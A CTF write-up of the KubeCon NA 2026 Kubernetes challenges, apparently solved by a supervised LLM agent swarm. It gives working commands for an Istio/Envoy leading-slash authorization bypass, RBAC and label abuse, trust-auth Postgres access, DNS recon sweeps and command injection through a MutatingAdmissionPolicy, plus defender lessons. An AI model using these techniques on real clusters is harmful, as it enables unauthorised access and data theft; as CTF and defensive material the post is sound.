---
title: "KubeCon NA 2026 CTF: six flags, two hours, one swarm"
date: 2026-11-13T07:00:00-07:00
tags: ["security", "kubernetes", "ctf", "kubecon"]
toc: true
---

Two hours inside ControlPlane's KubeCon NA 2026 CTF produced six of eight flags — 130 of 210 points, first solve on the board for both flags of the second challenge — and an honest miss on the last two, which outlasted the clock somewhere inside a network-policy puzzle. This write-up is reconstructed the way the run actually happened: from a timestamped evidence log, not from memory. Every command and output below is pasted from captured evidence; the interpretation came afterward, which is the only honest order to do it in.

> **Spoilers** for six of the eight flags, plus a detailed map of where the other two live.

"We" needs a word of explanation up front: the run was executed by an agent swarm — one orchestrator/judge session and rotating fresh-context LLM workers — under my supervision. The challenge mechanics below stand on their own; the orchestration gets its own section near the end.

## The run at a glance

| Challenge | Theme | Flags | Points | First flag | Closed |
|---|---|---|---|---|---|
| open-gates | Gateway API | 3/3 | 50/50 | 18:37Z | 18:50Z |
| two-wrongs-make-a-route | Calico + Istio | 2/2 | 60/60 | 19:02Z | 19:07Z — both first solves board-wide |
| do-not-spill-the-honey | Cilium + deception | 1/3 | 20/100 | 19:33Z | window closed 20:33Z |

Three constraints we held ourselves to, because they shaped everything below: a flag only counted once its exact string appeared in a raw evidence file; no paid hints (55 points of them went unbought on principle); and each challenge had exactly one mutation owner, with everything else read-only.

## Case file 1 — open-gates

The first bundle's banner, captured at 18:36Z:

```text
   ___  ____  _____ _   _    ____    _  _____ _____ ____
  / _ \|  _ \| ____| \ | |  / ___|  / \|_   _| ____/ ___|
 | | | | |_) |  _| |  \| | | |  _  / _ \ | | |  _| \___ \
 | |_| |  __/| |___ | |\  | | |_| |/ ___ \| | | |___ ___) |
  \___/|_|   |_____|_| \_|  \____/_/   \_\_| |_____|____/

  Welcome to the platform engineering jump host.

  The good news:
    We finally migrated to Gateway API.

  The bad news:
    Nobody agrees on who should be allowed to route what.

  Several teams have already migrated their services,
  while others are still figuring out how traffic is
  supposed to flow.

  You've been given limited access to investigate the
  current setup. Not everything is directly reachable,
  and not every namespace is under your control.

  Your mission:
    Explore the cluster, understand its routing
    configuration, and uncover three hidden flags.

  You have kubectl, a shell, and whatever permissions
  the platform team decided to give you.

  The gates are there. Whether they open is up to you.

  Good luck!
```

**What the permissions said before we touched anything.** The landing namespaces are `frontend`, `backend`, `internal`, and `envoy-gateway-system`, and the per-namespace `kubectl auth can-i --list` pass — not just the cluster-scoped one — revealed a split so deliberate it was practically a design document:

- `backend`: full verbs on `httproutes`
- `internal`: full verbs on `referencegrants`
- everywhere else: read-only

Routing state at landing: one Gateway (`eg`, in `frontend`) with `allowedRoutes: All`; one HTTPRoute already sending `/` and `/admin` to the frontend app; zero ReferenceGrants. Network policy sealed the jumpbox off from the app namespaces but admitted `envoy-gateway-system` into all of them. So the Gateway was the only door into the apps — and the RBAC split had already told us which two keys we'd been handed.

### 18:37Z — the first flag cost one probe

The existing route already matched `/admin`, the Gateway's ClusterIP was reachable from the jumpbox, and the route was bound to hostname `hello.k8s.ctf`. Send the Host header, collect:

```shell
curl -s -H 'Host: hello.k8s.ctf' http://10.108.29.148/admin
```

```json
{
  "flag-1": "flag_ctf{who_left_admin_exposed}"
}
```

The platform team had routed their own admin page through the public front door. Ten points, one request, zero permissions spent.

### The endpoint map was already in the pod specs

Before routing anywhere new, we needed to know what to route *to* — and the answer was sitting in plain sight. Each app is a Python one-pager baked into its pod spec as a `command:`, so pulling pods individually (`kubectl get pod -n backend <pod> -o yaml`) returns the full source:

- `backend-api` serves `/flag-2`
- `payments-api` (in `internal`) serves `/flag-3`
- both read the `ctf-flag` secret mounted at `/run/secrets`
- the frontend app serves `/`, `/status`, `/admin`

One caveat from the log: a bulk `kubectl get pods -A -o yaml` truncates at the CLI's output limit and silently drops the embedded source. Pull pods individually.

### 18:48Z — a route in `backend`

Attach an HTTPRoute to the Gateway from the namespace where we hold route verbs. Cross-namespace `parentRef` is fine because the Gateway accepts attach from all namespaces; the `backendRef` is same-namespace, so no grant is needed:

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: ctf-backend-route
  namespace: backend
spec:
  parentRefs:
  - name: eg
    namespace: frontend
  hostnames:
  - hello.k8s.ctf
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /backend
    filters:
    - type: URLRewrite
      urlRewrite:
        path:
          type: ReplacePrefixMatch
          replacePrefixMatch: /
    backendRefs:
    - name: backend-api
      port: 80
```

```shell
kubectl apply -f route.yaml
sleep 6
curl -s -H 'Host: hello.k8s.ctf' http://10.108.29.148/backend/flag-2
```

```json
{
  "flag-2": "flag_ctf{speak_httproute_and_enter}"
}
```

### 18:49Z — a grant in `internal`, negative first

Pointing the same shape at `payments-api` — a Service in `internal` — trips Gateway API's second trust boundary. The route attaches fine, but its backend reference won't resolve:

```shell
kubectl get httproute ctf-payments-route -n backend -o jsonpath='{.status}'
```

```json
{"parents":[{"conditions":[
  {"message":"Route is accepted","reason":"Accepted","status":"True","type":"Accepted"},
  {"message":"Failed to process route rule 0 backendRef 0: Backend ref to Service internal/payments-api not permitted by any ReferenceGrant.",
   "reason":"RefNotPermitted","status":"False","type":"ResolvedRefs"}
]}]}
```

That refusal is the proof the gate is real, and it names the fix. Spend the second key — `referencegrants` full verbs in `internal`:

```yaml
apiVersion: gateway.networking.k8s.io/v1beta1
kind: ReferenceGrant
metadata:
  name: ctf-allow-backend
  namespace: internal
spec:
  from:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    namespace: backend
  to:
  - group: ""
    kind: Service
    name: payments-api
```

`ResolvedRefs` flips to `True`, and the same curl through the Gateway lands:

```shell
curl -s -H 'Host: hello.k8s.ctf' http://10.108.29.148/payments/flag-3
```

```json
{
  "flag-3": "flag_ctf{permission_to_cross_granted}"
}
```

Mechanically, the three flags are a clean tour of Gateway API's two cross-namespace boundaries: who may *attach* to a Gateway (`allowedRoutes` — this one said everybody) and who may *reference* into a namespace (`ReferenceGrant` — held by the namespace being referenced). The challenge hands you write access in exactly the namespaces that matter for each hop.

### Also in the log

The Envoy data-plane pods expose unauthenticated Prometheus metrics on port 19001, and the metric names leak the programmed route topology (cluster names like `httproute/backend/ctf-backend-route`). Recon gold if you can reach the Envoy pods; no flag required it.

## Case file 2 — two-wrongs-make-a-route

The second bundle is a fresh cluster, about twenty minutes old at landing:

```text
    +-------------------+       +-------------------+
    |    TWO WRONGS     |------>|   MAKE A ROUTE    |
    +-------------------+       +-------------------+

                    You shall not pass!

You've been given access to a pod in the 'dev' namespace of a
shared Kubernetes cluster. The platform team insists its internal
services are protected by multiple layers of security, though not
every layer has been customized beyond its default configuration.

They've invited you to test that claim using only the
permissions granted to your account.

Retrieve both flags.
```

Landing identity: `root@dev`, service account `system:serviceaccount:dev:dev`, in a cluster running Istio 1.31.4, Flux, and Calico.

**Target and gates, as recon established them:**

- the target is `platform/api` — Python, source embedded in the pod spec: `GET /` returns flag 1, `GET /admin/config` returns flag 2 — at `api.platform.svc.cluster.local:8080`
- **Gate 1, Calico:** NetworkPolicy `platform/allow-tcp-8080` permits ingress to the api pod on TCP 8080 only from namespaces labeled `k8s.ctf/trusted=true`. Exactly one namespace carries the label: `production`
- **Gate 2, Istio:** AuthorizationPolicy `platform/api-admin` is a `DENY` on `/admin` and `/admin/*`, port 8080, for everyone except service account `production/admin-client`
- our RBAC: read-only broadly, plus exactly one write — patch/update on Namespace `dev` and nothing else (ClusterRole `edit-dev-ns`, `resourceNames: [dev]`)

A parsing lesson the log paid for: dump RBAC rule blocks verbatim before interpreting them. A quick regex pass initially attributed Flux write permissions to us that actually belonged to an aggregated `edit` ClusterRole nobody had bound to our account. One direct `kubectl auth can-i create gitrepositories.fluxcd.io` — answer: no — killed the misparse before anything was built on it.

### 19:01Z — wrong the first: a trust label the tenant can set

Read Gate 1 again. It trusts a *namespace label*. We hold `patch namespace/dev`. Those two sentences are the whole flag:

```shell
kubectl label ns dev k8s.ctf/trusted=true
curl -s http://api.platform.svc.cluster.local:8080/
```

```json
{
  "flag": "flag_ctf{trust_me_i_set_the_label}"
}
```

A network policy keyed on an attribute the guarded tenant controls is a door with the key taped to it. The flag name suggests the organizers knew.

`/admin/config` still answered `403 RBAC: access denied` from the Envoy rbac filter (`server: istio-envoy` on the response). No route to the exempt identity existed — no pod creation, no token minting, no exec — so flag 2 had to be a bypass of the DENY itself, in request shape.

### 19:06Z — wrong the second: two path stories

The mutation owner swept 26 path variants with `--path-as-is` (never let the client normalize for you). The condensed results:

| Path (`--path-as-is`) | Result |
|---|---|
| `/admin/config` | 403 — RBAC: access denied |
| `/admin//config`, `/admin/./config`, `/admin/config/` | 403 — RBAC denied |
| `/./admin/config`, `/x/../admin/config` | 403 — RBAC denied |
| `/admin%2fconfig`, `/%2fadmin/config` | 404 — app-level miss |
| `/ADMIN/CONFIG`, `/Admin/config` | 404 — app-level miss |
| **`//admin/config`** | **200 — flag** |

```shell
curl -si --path-as-is http://api.platform.svc.cluster.local:8080//admin/config
```

```json
{
  "service": "platform-api",
  "route": "/admin/config",
  "event": "KubeCon NA 2026",
  "status": "internal",
  "config": {
    "network": "managed",
    "authorization": "managed",
    "last_review": "pending"
  },
  "message": "Operating as designed is a matter of perspective.",
  "flag": "flag_ctf{slashes_tell_two_stories}"
}
```

Three layers, in the order the request passes them:

1. **Istio/Envoy RBAC** matches on the raw `:path`. `//admin/config` does not prefix-match `/admin` or `/admin/*` — it starts with `//` — so the DENY rule's path condition never fires.
2. **Envoy's default `merge_slashes: true`** normalizes the path before forwarding upstream. The app receives `/admin/config`.
3. The app compares strictly: `urlsplit(self.path).path == "/admin/config"`. Match.

The controls are what make the diagnosis and not a lucky guess: interior double slashes (`/admin//config` → 403) merge *before* RBAC sees the path, while a *leading* `//` survives the RBAC evaluation and only merges for the upstream. Dot-segment and percent-encoded variants fail at one layer or the other. And the banner had flagged the culprit in advance — "not every layer has been customized beyond its default configuration" is a precise description of Envoy shipping `merge_slashes` on by default.

### What the read-only scouts fenced off

Two fifteen-minute scout runs closed the alternatives before the mutation owner spent anything on them: the kubelet was hardened (webhook authorization, 401/403 on every subresource, read-only port closed), and all sidecar admin/telemetry ports (15000/15006/15020/15021/15090) were Calico-dropped from the dev pod — `allow-tcp-8080` permits exactly one port. Both rabbit holes deleted at scout budget. That asymmetry — cheap read-only refutation protecting expensive mutation time — was the single most valuable mechanic of the whole run.

## Case file 3 — do-not-spill-the-honey

The last bundle, worth 100 points across three flags, and the most atmospheric:

```text
          __         .' '.
        _/__)        .   .       .
       (8|)_}}- .      .        .
        `\__)    '. . ' ' .  . '


This Kubernetes cluster is rich with honey in the form of flags,
sweet enough to tempt any curious mind. Look closely: some may lie
hidden in tables among Utah's legends, while others drift through
message brokers. Take the challenge bravely, and let the Greeks'
ancient order guide your work.
```

Utah is the Beehive State; "tables among Utah's legends" is a database; "message brokers" and "the Greeks' ancient order" point at consuming broker topics in alphabetical order. All three CTFd entries share a single description: **"Hey! DNS the honey!"**

Landing identity: root on `jumppod`, service account `system:serviceaccount:default:jumppod`. The RBAC grant set is strange on purpose:

- get pods, services, and logs; cluster-wide read on namespaces and CiliumNetworkPolicies
- **delete pods in `ops` only** — the only mutation touching workloads
- **update/patch on MutatingAdmissionPolicies** — the genuinely odd grant; an existing `add-team-platform-label` policy stamps `team: platform` onto every pod CREATE
- create verbs: none, anywhere

That "no creates anywhere" is the setup for the first flag's punchline.

Workloads visible at landing: `db-bastion` (alpine, its own service account), `postgres:18` in `ops` with `POSTGRES_HOST_AUTH_METHOD=trust` sitting in the pod spec, two collector deployments, and a `queue-alpha` string that appears as a pod label in policy selectors.

### 19:31Z — the policy union nobody read

The postgres pod wears a purpose-built narrow gate: `postgres-only-from-db-bastion`, exactly what it sounds like. But the rule for reading Cilium policy is to read *every* policy selecting the endpoint, not the one named after it. An ops-wide `deny-ops-egress` policy also selects postgres — and it admits ingress from namespace `default` on any port. Cilium **unions** the allow rules across all policies selecting an endpoint, so the broad policy quietly nullifies the narrow one. A TCP dial from the jumppod to 5432 confirmed it: open.

Combine with trust auth and the database is one command away, no credentials involved:

```shell
psql -h postgres.ops.svc.cluster.local -U postgres -d postgres -P pager=off \
  -c "select * from public.utah_legendary_celebrities;"
```

```text
        name         |           hall_of_fame           | induction_year |                                   note
---------------------+----------------------------------+----------------+--------------------------------------------------------------------------
 Jack Dempsey        | Utah Sports Hall of Fame         |           1970 | World heavyweight boxing champion
 Steve Young         | Pro Football Hall of Fame        |           2005 | BYU alumnus and NFL quarterback
 Wat Misaka          | Utah Sports Hall of Fame         |           1999 | Historic NBA pioneer; flag_ctf{rbac_audit_prevents_privilege_escalation}
 Mark Eaton          | Utah Sports Hall of Fame         |           2010 | NBA Defensive Player of the Year
(15 rows)
```

`flag_ctf{rbac_audit_prevents_privilege_escalation}`, hidden in the `note` column of Wat Misaka — first non-white player in the NBA, Utah Sports Hall of Fame 1999. And the flag text names the intended difficulty: the RBAC grant set *looks* escalation-proof. The hole wasn't in RBAC at all; it was a policy-union gap in the network layer plus an authentication mode that made network reachability the only gate.

An operational note the log earned at this exact point: the first database sweep ran `pg_dump` with stderr discarded, and the pg_dump **v14 client silently aborts against a PG 18.6 server**. The empty grep looked like "no flags anywhere" — including the flag we had already found. It was caught by re-running with stderr visible and testing the tool against a known-positive first. Rule for the permanent collection: **trust no empty sweep without a positive control.**

### The map DNS handed over

With the database flag banked, the remaining two flags live with the brokers — and the challenge description says to use DNS. What DNS actually gives you on this cluster:

CoreDNS answers PTR records for service-endpoint pod IPs. A sweep of the entire pod CIDR (172.20.0.0/16 — all 65,536 addresses, batched `dig -x`) recovers the complete service map **with zero RBAC permissions**:

- `collector-data-processing` (10.99.197.236) — all ports dropped from our vantage; Cilium-gated
- `collector-restricted` (10.102.146.251) — reachable; an Express request-echo app
- `postgres.ops` — banked above
- `kube-dns` ×2
- **`queue-alpha`: no DNS presence at all.** No Service, no headless Service, nothing

A dictionary sweep of ~200 plausible names — broker products, Greek letters and gods, honey and bee words, Utah legends — returned all NXDOMAIN. The only naming convention that exists on the cluster is `<role>-<namespace>`. A PTR sweep of the service CIDR (exhaustive through 10.103.x and 55% beyond) inventoried every Service: `kubernetes`, `kube-dns`, `hubble-peer`, the two collectors, `postgres`. No broker Service anywhere. SRV, TXT, and AXFR (refused) added nothing.

And one trap worth documenting: this CoreDNS runs `pods insecure` — it will answer *any* `<ip>.<ns>.pod.cluster.local` query with the encoded IP without checking Kubernetes. Prove it before trusting any pod-form DNS result:

```shell
dig +short 8-8-8-8.kube-system.pod.cluster.local
# 8.8.8.8      ← resolves = insecure mode = pod-form results prove nothing
```

We caught this mid-run: a planned "does this pod exist" discriminator built on pod-form DNS would have false-confirmed pods inside the network-policy drop zones. Negative controls must be *impossible* values, not merely known-good ones.

### The thing the challenge name warned about

`collector-restricted` is the "do-not-spill-the-honey" warning made flesh. Thirteen probes — every route shape, methods, header and body variations, queue-themed payloads, HTTP/2 prior knowledge, absolute-form targets — returned the identical 200 echo of the request, ~20ms, with no storage, no auth, no fetch, no SSRF anywhere in reach. Verdict: a passive request-capture decoy, the exposed twin of the real, Cilium-gated `collector-data-processing`. The instruction is in the challenge's name — don't feed it. (A detail for the file: Express `trust proxy` is enabled, so `req.ip` behind it is `X-Forwarded-For`-spoofable. Nothing keys on it. It just wants to watch.)

### 20:33Z — where the clock won

The log's last entry is a policy revert. What it holds when it ends:

- **kubelets are hardened** on all three nodes — 401 anonymous, 403 under our service account on every metadata subresource, path-normalization tricks all fail, read-only port closed
- **node inventory via kubelet TLS certificate CNs** — reading a cert's subject needs no authentication. Three nodes, one pod-CIDR /24 each — which proves everything beyond 172.20.2.x is empty and deletes an entire class of "keep scanning the /16" effort
- **etcd on master-1:2379 is reachable from the jumppod** — the same policy-union gap extends to the control plane — but demands a client certificate from a standalone `etcd-ca`. Full cluster state behind one mTLS handshake we couldn't complete. The highest-value door left standing
- **postgres is conclusively not the broker** — zero application clients in `pg_stat_activity`, no NOTIFY traffic on 27 plausible channels, no cron/amqp/replication machinery
- **Cilium operator metrics** (node-2:9963) are unauthenticated — 900 lines of workqueue counters, nothing flag-shaped
- **the house-style bet, played and unfinished:** ControlPlane's recurring pattern is that the intended solve is *the one write permission you hold*. Ours were update/patch on MutatingAdmissionPolicies and delete-pods-in-`ops`. The play: patch the `add-team-platform-label` MAP to inject a command into the *recreated* `db-bastion` pod, delete the pod, read the output from logs — a poor man's exec under another service account. We used it to run SelfSubjectAccessReviews as the `db-bastion` identity: can it delete, patch, or create pods in `data-processing`? List pods in `restricted`? Read secrets? The policy was reverted and the mutated pod cleaned up before close. The identity question was still open when the window ended
- **full-port scans of every live pod IP** found exactly one nonstandard open port: 4240 on 172.20.0.107, which is cilium-health

Best remaining theory, recorded as a theory: the `queue-alpha` pods sit behind an **unreadable CiliumClusterwideNetworkPolicy** — the RBAC asymmetry is deliberate, namespaced CNPs readable, clusterwide ones not — reachable only from a `data-processing` identity. Which is precisely what the db-bastion hijack was reaching for when time expired. If you finished those two flags: well played, and I'd genuinely like to know how it ends.

## How the swarm ran it

No human typed the commands above. The run was executed by an agent swarm — an orchestrator/judge session and fresh-context workers (an open-weights model served locally), dispatched in waves through an agent orchestration layer — with me supervising and steering. This was a shakedown of a pattern we use for SOC hypothesis work, applied to a CTF for the first time.

The pieces that mattered:

- **A pattern pre-brief.** Before the event, four KubeCons' worth of public write-ups — Skybound's NA 2024 through EU 2026 series, and Iain Smart's account of a solo Claude attempt at EU 2026 — were distilled into a single pre-brief every worker read before acting: the universal opening moves (banner, home directory, `whoami`, per-namespace `can-i`, `api-resources`, enumerate everything `-o yaml`), a menu of misconfiguration families, where flags physically hide, and the known-hard techniques. Workers started from priors instead of rediscovering them under the clock. Crediting those sources here isn't courtesy — the pre-brief is built out of them.
- **Roles.** One **primary** per challenge owned all mutations. **Scouts** were read-only, one hypothesis family each, fifteen-minute hard budget. When the hunt stalled, dedicated **critics** got falsification assignments with per-hypothesis verdict deliverables. The orchestrator never hunted directly.
- **An evidence contract.** Every command's raw output streamed to timestamped files in per-worker directories. The judge graded files, not summaries. A flag counted only when its exact string appeared verbatim in a raw capture, and verified flags went to CTFd immediately.
- **Refute-first judging.** Every return was interrogated before it was believed: what would make this wrong — failed scopes reading as clean negatives, decoy credentials, stale state, wrong namespace? Dead ends were recorded as coverage so later waves never re-hunted them.

Performance, from the log: challenge 1 ran landing-to-complete in ~35 minutes (including a twenty-minute fight with the SSH wrapper, below); both challenge 2 flags were first solves board-wide; the honey database flag banked ~8 minutes after its wave dispatched. The dead-end recovery loop earned its keep three times over — read-only scouts killed the kubelet theory, the sidecar-port theory, and the honeypot temptation before any mutation owner touched them.

The judge was wrong exactly once, and it's the most instructive line in the log: armchair analysis predicted `//admin/config` would return 404, reasoning that Python's `urlsplit` would treat the leading `//` as a netloc separator. The model was right about `urlsplit` and wrong about everything else — it never occurred to the analysis that Envoy rewrites the path before the app sees it. The empirical 26-variant sweep won anyway because it was dispatched as a sweep, not as a bet on one analysis. When you can afford the sweep, sweep; derive the mechanism afterward, from the observation.

Gotchas from the run, useful to anyone regardless of how they play:

1. **The bastion login wrapper demands a pty, remotely.** Plain `ssh bastion 'cmd'` prints the banner and runs *nothing* — the remote wrapper needs a TTY and exits 0 silently. `ssh -T` doesn't help; the demand is remote-side. Fix: `printf 'cmd\nexit\n' | script -q /dev/null ssh ...` for a local pty.
2. **CTFd's API token auth only engages with `Content-Type: application/json`.** An `Accept` header alone leaves the `Authorization` token silently ignored; every API path 302s to `/login`. Nearly misdiagnosed as a bad token.
3. **A `~/.curlrc` containing `--location`** turns those 302s into fake 200s — the login page renders as success. `curl -q` or a no-redirect client when debugging HTTP auth.
4. **Cost-0 hints are free intel.** Unlock every free hint immediately; the paid ones went unbought on policy.
5. **The scoreboard and per-user solves endpoints are public pre-auth** — full board state and first-solve attribution without a token.
6. **Environments rotate per bundle.** Each challenge is a fresh cluster behind a new bastion; check the banner and creationTimestamps before attributing probe results to a challenge.

## What we'd tell a defender

The CTF is the toy version of a real audit method. The takeaways, in the order they'd bite you:

- **Audit RBAC by chain, not by role.** Every challenge's intended solve started from the one write verb the player held: `httproutes`+`referencegrants` split across two namespaces; `patch namespace/dev`; `update MutatingAdmissionPolicies` plus `delete pods in ops`. The right review question is "what's the worst chain that starts from exactly this verb, on exactly this `resourceNames` scope."
- **A policy keyed on a self-servable label is decorative.** If the tenant can set the trust anchor — their own namespace's labels — the gate belongs to them.
- **Normalization differentials break L7 policy.** An authz layer matching the raw path in front of a proxy that normalizes before the app has a gap between them; leading-`//` with `--path-as-is` is the canonical probe. Interior-`//` merging pre-RBAC versus leading-`//` merging post-RBAC was an entire flag.
- **Policy engines that union allows can be nullified by their broadest policy.** Cilium unions the allow rules of every policy selecting an endpoint — an ops-wide rule that quietly admits one namespace defeated a purpose-built postgres gate. Read all policies selecting a target, not the one named after it.
- **`POSTGRES_HOST_AUTH_METHOD=trust` makes network policy the only gate.** Acceptable only if that policy is actually sound — see above for how that went.
- **DNS is an RBAC-free recon channel.** PTR sweeps recover the service map with zero permissions, and `pods insecure` mints arbitrary A records for anyone who knows the encoding. Treat cluster DNS as exposed inventory.

## Sources

- [ControlPlane CTF setup](https://ctf.control-plane.io/setup/)
- [Skybound's KubeCon CTF write-ups](https://www.skybound.link/) — NA 2024 through EU 2026; the raw material for our workers' pre-brief
- [Iain Smart, "KubeCon CTF: The Human Viewpoint"](https://blog.iainsmart.co.uk/posts/2026-03-25-claudes-ctf-experience/) — a solo Claude attempt at EU 2026
